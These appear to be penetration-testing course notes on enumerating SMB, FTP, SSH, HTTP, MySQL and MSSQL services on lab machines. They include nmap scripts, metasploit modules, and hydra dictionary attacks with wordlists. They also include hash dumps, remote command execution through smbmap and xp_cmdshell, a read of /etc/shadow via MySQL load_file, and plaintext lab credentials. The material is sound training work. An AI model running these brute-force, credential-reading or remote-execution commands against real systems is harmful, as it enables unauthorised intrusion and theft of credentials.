# 3. Enumeration

### Introduction

Subjects :

* Serves and services
* SMB
* FTP
* SSH
* HTTP
* SQL

Learning objectives :

* Students will know purpose of service enumeration.
* Students will identify common services and protocols.
* Students will perform service enumeration on common services and protocols.
* Students will understand process for enumerating unfamiliar protocols and services.

### Servers and services

The questions are :

* What are they ?
* Why are they important ?
* What do they mean to cyber security ?

#### What is a server ?

It serves something up for the user and it provides some sort of functionality specialized to that machine that can be utilized from other devices. It can be running on Windows, Linux or macOS operating system. Any computer could by a server.

#### Why are they important ?

Servers need to be accessed remotely. The services running on a server require opening up a listening port on the server and accepting connections remotely.

#### What do they mean to cyber security ?

The problem lies in that inherent bugs or flaws or even features or misconfigurations in the software can give remote access to the whole system. This could let attackers into the system to do whatever they want, and that's exactly what we're trying to protect against.

### SMB

#### Windows discover and mount

```powershell
PS> ipconfig
```

The network is `10.3.25.0` and the mask is `255.255.240.0` or `/20` because of `8+8+4`.

<figure><img src="../../.gitbook/assets/18.png" alt=""><figcaption></figcaption></figure>

```powershell
PS> nmap -T4 10.3.25.0/20 --open
```

<figure><img src="../../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>

Both hosts are Windows machines. The port 445 hands SMB or CIFS. The port 139 set up the session for SMB, it's a big part of SMB for old machines.

```powershell
PS> nmap 10.3.28.154 -sV
```

<figure><img src="../../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>

* Once you discover the SMB service, you can open the explorer an **Map network drive**.

<figure><img src="../../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>

* In the folder input, enter the IP source `\\10.3.28.154` then browse.
* It may ask credentials and use the given ones from the lab information.
* Select the C folder and then click on OK.

The folder is mounted on the `Z:` partition ! To remove the mounted folder, execute the following command and select **yes**. After that, it should be removed.

```powershell
PS> net use * /delete
```

The command line to mount the SMB folder is :

```powershell
PS> net use Z: \\10.3.28.154\c$ smbserver_771 /user:administrator
```

#### NMAP scripts

1. smb-protocols

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-protocols
```

<figure><img src="../../.gitbook/assets/21.png" alt=""><figcaption></figcaption></figure>

The default configuration is dangerous.

2. smb-security-mode

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-security-mode
```

<figure><img src="../../.gitbook/assets/22.png" alt=""><figcaption></figcaption></figure>

There is a guest account. Again, the default configuration is dangerous.

3. smb-enum-sessions

It's possible to try to log in as guest and **Bob** doesn't need credentials to connect to the SMB.

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-enum-sessions
```

<figure><img src="../../.gitbook/assets/23.png" alt=""><figcaption></figcaption></figure>

You can try to connect with admin credentials given on the lab information. It reveals an active SMB session as ADMINISTRATOR.

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771
```

<figure><img src="../../.gitbook/assets/24.png" alt=""><figcaption></figcaption></figure>

4. smb-enum-shares

You can try enumerate folders as `guest`.

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-enum-shares
```

The account used is `guest` and there are several SMB folders available.

<figure><img src="../../.gitbook/assets/25.png" alt=""><figcaption></figcaption></figure>

Then you can try enumerate SMB folders as specific user. You can see there are more information and the permission has changed.

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-enum-shares --script-args smbusername=administrator smbpassword=smbserver_771
```

<figure><img src="../../.gitbook/assets/26.png" alt=""><figcaption></figcaption></figure>

5. smb-enum-users

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-enum-users --script-args smbusername=administrator smbpassword=smbserver_771
```

The `Guest` user account does not require password and it never expires. Furthermore, he is logged as a normal user account.

<figure><img src="../../.gitbook/assets/27.png" alt=""><figcaption></figcaption></figure>

6. smb-server-stats

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-server-stats --script-args smbusername=administrator smbpassword=smbserver_771
```

<figure><img src="../../.gitbook/assets/28.png" alt=""><figcaption></figcaption></figure>

7. smb-enum-domains

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-enum-domains --script-args smbusername=administrator smbpassword=smbserver_771
```

<figure><img src="../../.gitbook/assets/29.png" alt=""><figcaption></figcaption></figure>

8. smb-enum-groups

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-enum-groups --script-args smbusername=administrator smbpassword=smbserver_771
```

<figure><img src="../../.gitbook/assets/30.png" alt=""><figcaption></figcaption></figure>

9. smb-enum-services

```powershell
PS> nmap 10.3.31.161 -p 445 --script smb-enum-services --script-args smbusername=administrator smbpassword=smbserver_771
```

<figure><img src="../../.gitbook/assets/31.png" alt=""><figcaption></figcaption></figure>

10. smb-ls

```bash
john@kali> nmap 10.13.17.58 -p 445 --script smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771
```

<figure><img src="../../.gitbook/assets/32.png" alt=""><figcaption></figcaption></figure>

By the way, it's possible to enumerate several script at the same time.

```bash
john@kali> nmap 10.13.17.58 -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771
```

#### SMBMap

```bash
john@kali> ping 10.3.29.243
john@kali> nmap 10.3.29.243
john@kali> nmap -p445 --script smb-protocols 10.3.29.243
john@kali> smbmap -u guest -p '' -H 10.3.29.243
john@kali> smbmap -u administrator -p smbserver_771 -H 10.3.29.243
john@kali> smbmap -u administrator -p smbserver_771 -H 10.3.29.243 -x 'ipconfig'
john@kali> smbmap -u administrator -p smbserver_771 -H 10.3.29.243 -x 'dir'
john@kali> smbmap -u administrator -p smbserver_771 -H 10.3.29.243 -L
john@kali> smbmap -u administrator -p smbserver_771 -H 10.3.29.243 -r 'c$'

john@kali> echo 'Hello backdoor' > backdoor.txt
john@kali> smbmap -u administrator -p smbserver_771 -H 10.3.29.243 --upload 'backdoor.txt' 'c$\backdoor.txt'

john@kali> smbmap -u administrator -p smbserver_771 -H 10.3.29.243 --download 'c$\flag.txt'
john@kali> cat 10.3.29.243-C_flag.txt
```

#### Samba 1

There are different tool for SMB

1. NMAP with `smb-os-discovery`

```bash
john@kali> nmap 192.221.185.3                                  # check ports
john@kali> nmap 192.221.185.3 -sV -p 139,445                   # check TCP versions
john@kali> nmap 192.221.185.3 -sU --top-port 25 --open         # find UDP open ports
john@kali> nmap 192.221.185.3 -sU -p 137,138 -sV               # check UDP versions
john@kali> nmap 192.221.185.3 -p 445 --script smb-os-discovery # find OS
```

2. `msfconsole`

```
john@kali> msfconsole
msf5> use scanner/smb/smb_version
msf5> set rhosts 192.221.185.3
msf5> run
msf5> exit
```

3. `nmblookup`

```bash
john@kali> nmblookup -A 192.221.185.3
```

4. `smbclient`

```bash
john@kali> smbclient -L 192.221.185.3 -N
```

5. `rpcclient`

```bash
john@kali> rpcclient -U '' -N 192.221.185.3
```

#### Samba 2

```bash
john@kali> ping 192.29.141.3
john@kali> nmap 192.29.141.3
john@kali> nmap 192.29.141.3 -p 445 -sV

# 1. Find the OS version of samba server using rpcclient.
john@kali> rpcclient -U '' -N 192.29.141.3
rpcclient> srvinfo
rpcclient> exit

# 2. Find the OS version of samba server using enum4Linux.
john@kali> enum4linux -o 192.29.141.3

# 3. Find the server description of samba server using smbclient.
john@kali> smbclient -L -N 192.29.141.3

# 4. Is NT LM 0.12 (SMBv1) dialects supported by the samba server? Use appropriate nmap script.
john@kali> nmap -p 445 --script smb-protocols 192.29.141.3

# 5. Is SMB2 protocol supported by the samba server? Use smb2 metasploit module.
john@kali> msfconsole
msf5> use scanner/smb/smb2
msf5> set rhosts 192.29.141.3
msf5> exploit
msf5> exit

# 6. List all users that exists on the samba server  using appropriate nmap script.
john@kali> nmap --script smb-enum-users -p 445 192.29.141.3

# 7. List all users that exists on the samba server  using smb_enumusers metasploit modules.
john@kali> msfconsole
msf5> use scanner/smb/smb_enumusers
msf5> set rhosts 192.29.141.3
msf5> exploit

# 8. List all users that exists on the samba server  using enum4Linux.
john@kali> enum4linux -192.29.141.3

# 9. List all users that exists on the samba server  using rpcclient.
john@kali> rpcclient -U '' -N 192.29.141.3
rpcclient> enumdomusers
rcpclient> exit

# 10. Find SID of user “admin” using rpcclient.
john@kali> rpcclient -U '' -N 192.29.141.3
rpcclient> lookupnames admin
rpcclient> exit
```

#### Samba 3

```bash
john@kali> ip a
john@kali> ping 192.30.188.3
john@kali> nmap 192.30.188.3
john@kali> nmap 192.30.188.3 -sV -p 139,445

# 1. List all available shares on the samba server using Nmap script.
john@kali> nmap 192.30.188.3 --script smb-enum-shares -p 445

# 2. List all available shares on the samba server using smb_enumshares Metasploit module.
john@kali> msfconsole
msf5> use scanner/smb/smb_enumshares
msf5> set rhosts 192.30.188.3
msf5> run
msf5> exit

# 3. List all available shares on the samba server using enum4Linux.
john@kali> enum4linux -S 192.30.188.3

# 4. List all available shares on the samba server using smbclient.
john@kali> smbclient -U '' -N 192.30.188.3

# 5. Find domain groups that exist on the samba server by using enum4Linux.
john@kali> enum4linux -G 192.30.188.3

# 6. Find domain groups that exist on the samba server by using rpcclient.
john@kali> rpcclient -U '' -N 192.30.188.3
rpcclient> enumdomgroups
rpcclient> exit

# 7. Is samba server configured for printing?


# 8. How many directories are present inside share “public”?
john@kali> smbclient -U '' -N \\\\192.30.188.3\\public
smb> ls
smb> exit

# 9. Fetch the flag from samba server.
john@kali> smbclient -U '' -N \\\\192.30.188.3\\public
smb> cd secret
smb> get flag
smb> exit
john@kali> cat flag

```

#### Dictionary attack

```bash
john@kali> ip a
john@kali> ping 192.235.130.3
john@kali> nmap 192.235.130.3
john@kali> nmap 192.235.130.3 -p 139,445 -sV

# 1. What is the password of user “jane” required to access share “jane”?
#    Use smb_login metasploit module with password wordlist usr/share/wordlists/metasploit/unix_passwords.txt
john@kali> msfconsole
msf5> use scanner/smb/smb_login
msf5> set rhosts 192.235.130.3
msf5> set smbuser jane
msf5> set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
msf5> run
msf5> exit

# 2. What is the password of user “admin” required to access share “admin”?
#    Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
john@kali> hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 192.235.130.3 smb

# 3. Which share is read only? Use smbmap with credentials obtained in question 2.
john@kali> smbmap -H 192.235.130.3 -u admin -p password1

# 4. Is share “jane” browseable? Use credentials obtained from the 1st question.
john@kali> smbmap -H 192.235.130.3 -u jane -p abc123

# 5. Fetch the flag from share “admin”
john@kali> smbclient -U admin \\\\192.235.130.3\\admin
smb> cd hidden
smb> get flag.tar.gz
smb> exit
john@kali> tar -xvf flag.tar.gz
john@kali> cat flag

# 6. List the named pipes available over SMB on the samba server?
#    Use pipe_auditor metasploit module with credentials obtained from question 2.
john@kali> msfconsole
msf5> use scanner/smb/pip_auditor
msf5> set rhosts 192.235.130.3
msf5> set smbuser admin
msf5> set smbpass password1
msf5> run
msf5> exit

# 7. List sid of Unix users shawn, jane, nancy and admin respectively
#    by performing RID cycling  using enum4Linux with credentials obtained in question 2.
john@kali> enum4linux -u admin -p password1 -r 192.235.130.3
```

Credentials :

```
jane:abc123
admin:password1
```

### FTP

#### Basics

```bash
john@kali> ip a
john@kali> ping 192.152.30.3
john@kali> nmap 192.152.30.3

# 1. What is the version of FTP server?
john@kali> nmap 192.152.30.3 -p 21 -sV

# 2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt 
#    and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
#    to check if any of these credentials work on the system. List all found credentials.
john@kali> hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.152.20.3 ftp

# 3. Find the password of user “sysadmin” using nmap script.
john@kali> echo 'sysadmin' > user.txt
john@kali> nmap 192.152.20.3 --script ftp-brute -p 21 --script-args passdb='/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt',userdb='user.txt'

# 4. Find seven flags hidden on the server.
john@kali> ftp 192.152.20.3 (sysadmin:654321, rooty:qwerty, (...), diag:tigger)
ftp> get secret.txt
```

Credentials : `sysadmin:654321` `rooty:qwerty` `demo:butterfly` `auditor:chocolate` `anon:purple` `administrator:tweety` `diag:tigger`

#### Anonymous login

```bash
john@kali> ip a
john@kali> ping 192.24.220.3
john@kali> nmap 192.24.220.3

# 1. Find the version of vsftpd server.
john@kali> nmap 192.24.220.3 -p 21 -sV

# 2. Check whether anonymous login is allowed on the ftp server using nmap script.
john@kali> nmap 192.24.220.3 -p 21 --script ftp-anon

# 3. Fetch the flag from FTP server.
john@kali> ftp 192.24.220.3 (anonymous:)
ftp> get flag
ftp> exit
john@kali> cat flag
```

### SSH

#### Basics

```bash
john@kali> ip a
john@kali> ping 192.250.219.3
john@kali> nmap 192.250.219.3

# 1. What is the version of SSH server.
john@kali> nmap 192.250.219.3 -p 22 -sV

# 2. Fetch the banner using netcat and check the version of SSH server.
john@kali> nc 192.250.219.3 22

# 3. Fetch pre-login SSH banner.
john@kali> ssh root@192.250.219.3

# 4. How many “encryption_algorithms” are supported by the SSH server.
john@kali> nmap 192.250.219.3 -p 22 --script ssh2-enum-algos

# 5. What is the ssh-rsa host key being used by the SSH server.
john@kali> nmap 192.250.219.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full

# 6. Which authentication method is being used by the SSH server for user “student”.
john@kali> nmap 192.250.219.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"

# 7. Which authentication method is being used by the SSH server for user “admin”.
john@kali> nmap 192.250.219.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"

# 8. Fetch the flag from /home/student/FLAG by using nmap ssh-run script.
john@kali> ssh student@192.250.219.3
student@victim> cat FLAG
```

#### Dictionary attack

```bash
john@kali> ip a
john@kali> ping 192.254.198.3
john@kali> nmap 192.254.198.3

# 1. Find the password of user “student” using hydra.
john@kali> hydra -l student -P /usr/share/wordlists/rockyou.txt.gz 192.254.198.3 ssh

# 2. Find the password of user “administrator” use appropriate Nmap scripts
#    with password dictionary: /usr/share/nmap/nselib/data/passwords.lst
john@kali> echo 'administator' > user.txt
john@kali> nmap 192.254.198.3 -p 22 --script ssh-brute --script-args passdb=/usr/share/nmap/nselib/data/passwords.lst,userdb=user.txt

# 3. Find the password of user “root” using ssh_login Metasploit module
#    with userpass dictionary: /usr/share/wordlists/metasploit/root_userpass.txt
john@kali> msfconsole
msf5> use scanner/ssh/ssh_login
msf5> set rhosts 192.254.198.3
msf5> set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
msf5> set verbose true
msf5> set stop_on_success true
msf5> run

# 4. What is the message of the day? (Printed after the user logs in to the SSH server).
john@kali> ssh root@192.254.198.3
```

Credentials : `student:friend` `administrator:sunshine` `root:attack`

### HTTP

HTTP is hosting website and websites are a big part of the Internet.

#### IIS

```bash
john@kali> ip a
john@kali> nmap 10.3.23.59 -sV
john@kali> whatweb 10.3.23.59
```

<figure><img src="../../.gitbook/assets/33.png" alt=""><figcaption></figcaption></figure>

The HTTP service is running on port 80 and the website is **webgoat.net**. It's a purposefully vulnerable application website built by OWASP for teaching, training and learning. On this website, there are `Microsoft IIS 10.0` and `X-XSS-Protection 0`.

1. `http`

It shows up information about the website in its response.

```bash
john@kali> http 10.3.17.179
```

<figure><img src="../../.gitbook/assets/34.png" alt=""><figcaption></figcaption></figure>

2. `dirb`

That's a basic enumeration for the website directories and subdirectories.

```
john@kali> dirb http://10.3.17.179
```

<figure><img src="../../.gitbook/assets/35.png" alt=""><figcaption></figcaption></figure>

3. `browsh`

It opens the GUI website in the terminal.

```
john@kali> browsh --startup-url http://10.3.17.179/Default.aspx
```

<figure><img src="../../.gitbook/assets/36.png" alt=""><figcaption></figcaption></figure>

#### IIS Nmap scripts

```bash
john@kali> ip a
john@kali> ping 
john@kali> nmap 10.2.31.38

# 1. Identify IIS Server
john@kali> nmap 10.2.31.38 -sV

# 2. Get webserver header details
john@kali> nmap 10.2.31.38 -p 80 --script http-headers

# 3. Enumerated HTTP methods
john@kali> nmap 10.2.31.38 -p 80 --script http-enum
john@kali> nmap 10.2.31.38 -p 80 --script http-methods --script-args http-methods.url /webdav/

# 4. Detect WebDAV configuration - etc.
john@kali> nmap 10.2.31.38 -p 80 --script http-webdav-scan --script-args http-methods.url /webdav/
```

#### Apache

```bash
john@kali> ip a
john@kali> nmap 192.237.132.3

# 1. Which web server software is running on the target server and also find out the version using nmap.
john@kali> nmap 192.237.132.3 -p 80 -sV
john@kali> nmap 192.237.132.3 -p 80 --script banner

# 2. Which web server software is running on the target server
#    and also find out the version using suitable metasploit module.
john@kali> msfconsole
msf5> use scanner/http/http_version
msf5> set rhosts 192.237.132.3
msf5> run
msf5> exit

# 3. Check what web app is hosted on the web server using curl command.
john@kali> curl http://192.237.132.3 | more

# 4. Check what web app is hosted on the web server using wget command.
john@kali> wget http://192.237.132.3
john@kali> cat index

# 5. Check what web app is hosted on the web server using browsh CLI based browser.
john@kali> browsh --startup-url 192.237.132.3

# 6. Check what web app is hosted on the web server using lynx CLI based browser.
john@kali> lynx 192.237.132.3

# 7. Perform bruteforce on webserver directories and list the names of directories found.
#    Use brute_dirs metasploit module.
john@kali> msfconsole
msf5> use scanner/http/brute_dirs
msf5> set rhosts 192.237.132.3
msf5> run
msf5> exit

# 8. Use the directory buster (dirb) with tool/usr/share/metasploit-framework/data/wordlists/directory.txt
#    dictionary to check if any directory is present in the root folder of the web server. 
#    List the names of found directories.
john@kali> dirb http://192.237.132.3 /usr/share/metasploit-framework/data/wordlists/directory.txt

# 9. Which bot is specifically banned from accessing a specific directory?
john@kali> curl http://192.237.132.3/robots.txt 
```

### SQL

#### MySQL Basics

```bash
john@kali> ip a

# 1. What is the version of MySQL server?
john@kali> nmap 192.193.26.3 -sV

# 2. What command is used to connect to remote MySQL database?
john@kali> mysql -h 192.193.26.3 -u root

# 3. How many databases are present on the database server?
MySQL> show databases;

# 4. How many records are present in table “authors”? This table is present inside the “books” database.
MySQL> use books;
MySQL> select count(*) from authors;

# 5. Dump the schema of all databases from the server using suitable metasploit module?
john@kali> msfconsole
msf5> use scanner/mysql/mysql_schemadump
msf5> set rhosts 192.193.26.3
msf5> set username root
msf5> run

# 6. How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
msf5> use scanner/mysql/mysql_writable_dirs
msf5> set rhosts 192.193.26.3
msf5> set verbose false
msf5> set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
msf5> set file_name test
msf5> run

# 7. How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.


# 8. Find the system password hash for user "root".
MySQL> select load_file('/etc/shadow');

# 9. How many database users are present on the database server? Lists their names and password hashes.
msf5> use scanner/mysql/mysql_hashdump
msf5> set rhosts 192.193.26.3
msf5> set username root
msf5> run

# 10. Check whether anonymous login is allowed on MySQL Server.
john@kali> nmap 192.193.26.3 -p 3306 --script mysql-empty-password

# 11. Check whether “InteractiveClient” capability is supported on the MySQL server.
john@kali> nmap 192.193.26.3 -p 3306 --script mysql-info

# 12. Enumerate the users present on MySQL database server using mysql-users nmap script.
john@kali> nmap 192.193.26.3 -p 3306 --script mysql-users --script-args 'mysqluser=root'

# 13. List all databases stored on the MySQL Server using nmap script.
john@kali> nmap 192.193.26.3 -p 3306 --script mysql-databases --script-args 'mysqluser=root'

# 14. Find the data directory used by mysql server using nmap script.
john@kali> nmap 192.193.26.3 -p 3306 --script mysql-variables --script-args 'mysqluser=root'

# 15. Check whether File Privileges can be granted to non admin users using mysql_audi nmap script.
john@kali> nmap 192.193.26.3 -p 3306 --script mysql-audit --script-args 'mysql-audit.username=root,mysql-audit.filename=/usr/share/nmap/nselib/data/mysql-cis.audit'

# 16. Dump all user hashes using  nmap script.
john@kali> nmap 192.193.26.3 -p 3306 --script mysql-dump-hashes --script-args 'username=root'

# 17. Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.
john@kali> nmap 192.193.26.3 -p 3306 --script mysql-query --script-args 'query="select count(*) from books.authors",username=root'
```

#### MySQL Dictionary attack

```bash
john@kali> ip a
john@kali> nmap 192.86.53.3

# 1. Find the password of user “root” which is required to access the MySQL server.
#    Use suitable metasploit module with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
john@kali> msfconsole
msf5> use scanner/mysql/mysql_login
msf5> set rhosts 192.86.53.3
msf5> set username root
msf5> set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5> run

# 2. Find the password of user “root” which is required to access the MySQL server. 
#    Use Hydra with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
john@kali> hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.86.53.3 mysql
```

#### MSSQL Nmap scripts

```bash
john@kali> ip a
john@kali> nmap 10.2.18.228

# 1. Identify MSSQL Database Server
john@kali> nmap 10.2.18.228 -p 1433 -sV

# 2. Find information from the MSSQL server with NTLM.
john@kali> nmap 10.2.18.228 -p 1433 --script ms-sql-ntlm-info

# 3. Enumerate all valid MSSQL users and passwords
john@kali> nmap 10.2.18.228 --script ms-sql-brute --script-args='userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt'

# 4. Identify 'sa' user password
john@kali> nmap 10.2.18.228 --script ms-sql-empty-password

# 5. Execute MSSQL query to extract sysusers
john@kali> nmap 10.2.18.228 --script ms-sql-query --script-args mssql.username=sa,ms-sql-query.query="select * from master..syslogins"

# 6. Dump MSSQL users hashes
john@kali> nmap 10.2.18.228 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria

# 7. Execute a command on MSSQL to retrieve the flag. (The flag is located inside C:\flag.txt)
john@kali> nmap 10.2.18.228 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd='more C:\flag.txt'
```

Credentials : `admin:anamaria` `dbadmin:bubbles1` `auditor:jasmine1`

#### MSSQL Metasploit

```bash
john@kali> ip a
john@kali> nmap 10.2.17.166
john@kali> nmap 10.2.17.166 -p 1433 -sV

# 1. Discover valid users and their passwords
john@kali> msfconsole
msf6> use scanner/mssql/mssql_login
msf6> set username ""
msf6> set user_file /root/Desktop/wordlist/common_users.txt
msf6> set pass_file /root/Desktop/wordlist/100-common-passwords.txt
msf6> set rhosts 10.2.17.166
msf6> set verbose false
msf6> run

# 2. Enumerate MSSQL configuration
msf6> use admin/mssql/mssql_enum
msf6> set rhosts 10.2.17.166

# 3. Enumerate all MSSQL logins
msf6> use admin/mssql/mssql_enum_sql_logins
msf6> set rhosts 10.2.17.166
msf6> run

# 4. Execute a command on the target machine
msf6> use admin/mssql/mssql_exec
msf6> set rhosts 10.2.17.166
msf6> set cmd whoami
msf6> run

# 5. Enumerate all available system users
msf6> use admin/mssql/mssql_enum_domain_accounts
msf6> set rhosts 10.2.17.166
msf6> run
```

Credentials : `admin:bubbles1` `sa:` `dbadmin:anamaria` `auditor:nikita`